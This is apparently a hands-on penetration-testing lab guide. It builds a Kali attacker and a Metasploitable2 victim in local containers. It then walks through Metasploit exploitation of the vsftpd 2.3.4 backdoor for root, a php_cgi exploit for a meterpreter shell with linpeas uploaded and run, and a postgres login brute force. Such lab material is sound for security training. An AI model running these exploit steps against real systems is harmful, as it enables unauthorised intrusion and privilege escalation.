
## Setup 

```bash
make up
make ps
```

```bash
make logs container=meta2
make logs container=kali 
```

```bash
make access container=meta2
make access container=kali
```

In each container, run:

```bash
ifconfig # you should see 172.20.0.3 for the attacker and 172.20.0.2 for the victim 
```

From kali, run:

```bash
nmap -F 172.20.0.2
```

## Penetration

### Privilege Escalation

From kali:

```bash
nmap -sV -p 21 172.20.0.2
```

```bash
msfconsole
search vsftpd
#   1  exploit/unix/ftp/vsftpd_234_backdoor
use 1
set rhosts 172.20.0.2
set rport 21
exploit
```

Now to check previliges, directly type:

```bash
touch you_are_pwned
```

```bash
whoami #root
```

### Data gathering
From kali:
```bash
#Download linpeas.sh script
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```
We will run the script by exploiting a php vulnerability but from a non-privileged user
```bash
msfconsole
search php_cgi
use 0
set rhosts 172.20.0.2
exploit
# we get a meterpreter session
# from here, we upload the linpeas script to the victim
upload linpeas.sh .
shell #we open a shell in victim
ls #check file was uploaded successfully
chmod 777 linpeas.sh
./linpeas.sh
```

### Password brute force
From kali:
```bash
msfconsole
search postgres
#   9   auxiliary/scanner/postgres/postgres_login
use 9
set rhosts 172.20.0.2
set STOP_ON_SUCCESS true
run
```

## Stop the containers

```bash
make down
```
